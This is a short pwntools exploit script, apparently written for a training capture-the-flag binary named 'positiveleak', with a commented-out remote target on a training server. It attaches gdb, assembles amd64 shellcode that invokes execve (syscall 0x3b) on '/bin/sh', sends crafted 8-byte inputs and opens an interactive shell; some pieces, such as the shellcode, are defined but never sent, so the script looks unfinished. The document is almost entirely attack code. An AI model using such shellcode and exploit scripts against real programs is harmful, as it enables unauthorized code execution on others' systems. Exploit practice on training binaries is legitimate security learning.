from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = process("./positiveleak")
gdb.attach(r,'''
b * add_numbers+300
''')

# r = remote("bin.training.offdef.it", 4006)

asm_code = """
mov rdi, rax
add rdi, 16
mov rax, 0x3b
syscall
"""

context.arch = 'amd64'
stringa = b"/bin/sh" + b"\x00"


shellcode = asm(asm_code)


r.sendline(0x0.to_bytes(8,byteorder='big'))
input("wait")

r.send(0x1.to_bytes(8,byteorder='big'))
input("wait")

r.send(p64(0x0a))



r.interactive()